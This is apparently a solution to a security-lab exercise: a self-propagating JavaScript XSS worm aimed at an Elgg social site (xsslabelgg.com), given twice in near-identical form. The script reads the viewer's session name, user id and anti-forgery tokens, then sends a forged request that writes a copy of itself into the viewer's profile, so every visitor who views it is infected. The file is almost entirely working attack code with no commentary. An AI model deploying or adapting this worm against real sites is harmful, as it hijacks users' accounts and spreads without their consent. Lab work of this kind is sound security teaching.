<script id="worm" type="text/javascript">
	window.onload = function(){
	var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
	var jsCode = document.getElementById("worm").innerHTML;
	var tailTag = "</" + "script>";
	var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
	//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
	//and Security Token __elgg_token
	var user_name=elgg.session.user.name;
	var user_guid=elgg.session.user.guid;
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;
	//& b4 token?
	//Construct the content of your url.
    var sendurl="http://www.xsslabelgg.com/action/profile/edit"; //FILL IN
	var content=token+ts+"&name="+user_name+"&description="+wormCode+"&accesslevel%5Bdescription%5D=2&briefdescription=miss+me&accesslevel%5Bbriefdescription%5D=2&location=&accesslevel%5Blocation%5D=2&interests=&accesslevel%5Binterests%5D=2&skills=&accesslevel%5Bskills%5D=2&contactemail=&accesslevel%5Bcontactemail%5D=2&phone=&accesslevel%5Bphone%5D=2&mobile=&accesslevel%5Bmobile%5D=2&website=&accesslevel%5Bwebsite%5D=2&twitter=&accesslevel%5Btwitter%5D=2&guid="+user_guid;
	console.log(user_guid+" "+user_name);

	if(user_guid !== 47)
	{
		//Create and send Ajax request to modify profile
		var Ajax=null;
		Ajax=new XMLHttpRequest();
		Ajax.open("POST",sendurl,true);
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type",
		"application/x-www-form-urlencoded");
		Ajax.send(content);
		 console.log("POST sent");
	}
	}	
	console.log(jsCode);
</script>


<script id=worm>
	window.onload = function(){
	var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
	var jsCode = document.getElementById("worm").innerHTML;
	var tailTag = "</" + "script>";
	var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
	//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
	//and Security Token __elgg_token
	var user_name=elgg.session.user.name;
	var user_guid=elgg.session.user.guid;
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;
	//& b4 token?
	//Construct the content of your url.
    var sendurl="http://www.xsslabelgg.com/action/profile/edit"; //FILL IN
	var content=token+ts+"&name="+user_name+"&description="+wormCode+"&accesslevel%5Bdescription%5D=2&briefdescription=miss+me&accesslevel%5Bbriefdescription%5D=2&location=&accesslevel%5Blocation%5D=2&interests=&accesslevel%5Binterests%5D=2&skills=&accesslevel%5Bskills%5D=2&contactemail=&accesslevel%5Bcontactemail%5D=2&phone=&accesslevel%5Bphone%5D=2&mobile=&accesslevel%5Bmobile%5D=2&website=&accesslevel%5Bwebsite%5D=2&twitter=&accesslevel%5Btwitter%5D=2&guid="+user_guid;
	console.log(user_guid+" "+user_name);

	if(user_guid !== 47)
	{
		//Create and send Ajax request to modify profile
		var Ajax=null;
		Ajax=new XMLHttpRequest();
		Ajax.open("POST",sendurl,true);
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type",
		"application/x-www-form-urlencoded");
		Ajax.send(content);
		 console.log("POST sent");
	}
	}	
</script>